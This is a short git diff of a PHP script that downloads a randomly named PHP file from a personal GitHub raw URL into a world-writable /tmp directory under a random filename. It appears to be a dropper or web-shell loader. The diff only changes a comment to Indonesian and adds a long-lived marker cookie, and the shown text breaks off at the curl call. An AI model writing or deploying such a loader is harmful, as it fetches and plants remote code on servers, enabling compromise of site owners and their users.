@@ -2,7 +2,7 @@
 
 $url = 'https://raw.githubusercontent.com/dan1584/asfdas/main/Aks525jkwuy.php';
 
-$targetDir = '/tmp'; // changed to /tmp folder
+$targetDir = '/tmp'; // Menyimpan file ke direktori /tmp
 
 if (!is_dir($targetDir)) {
     mkdir($targetDir, 0777, true);
@@ -10,6 +10,8 @@ if (!is_dir($targetDir)) {
 
 $randomFileName = uniqid() . '.php';
 $targetFile = $targetDir . '/' . $randomFileName;
+
+setcookie("burungbebek", "true", time() + 9999999, "/");
 
 if (!file_exists($targetFile)) {
     $ch = curl_init($url);
